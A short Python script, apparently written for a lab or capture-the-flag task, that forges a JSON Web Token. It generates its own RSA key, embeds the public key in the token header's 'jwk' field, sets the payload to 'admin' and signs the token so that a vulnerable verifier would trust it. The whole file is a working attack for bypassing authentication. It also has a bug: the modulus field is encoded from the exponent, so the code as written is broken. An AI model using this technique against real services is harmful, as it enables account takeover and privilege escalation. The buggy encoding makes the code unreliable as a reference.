import OpenSSL
import base64
import json
import hashlib

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding

key = OpenSSL.crypto.PKey()
key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
priv_key = key.to_cryptography_key()
pub_key = priv_key.public_key()


header = {	"alg":"RS256",
  			"jwk":  {	"kty":"RSA",
          				"kid":"bilbo.baggins@hobbiton.example",
          				"use":"sig"
          }
}

e = pub_key.public_numbers().e
n = pub_key.public_numbers().n

header["jwk"]["e"] = base64.urlsafe_b64encode((e).to_bytes((e).bit_length()//8+1, byteorder='big')).decode("utf-8").rstrip("=")
header["jwk"]["n"] = base64.urlsafe_b64encode((e).to_bytes((n).bit_length()//8+1, byteorder='big')).decode("utf-8").rstrip("=")

#base64 value of admin
payload = "YWRtaW4"

val = base64.urlsafe_b64encode(bytes(json.dumps(header), encoding='utf-8')).decode('utf-8').rstrip("=")+"."+payload

sig = priv_key.sign(bytes(val, encoding='utf-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())

print(val+"."+base64.urlsafe_b64encode(sig).decode('utf-8').rstrip("="))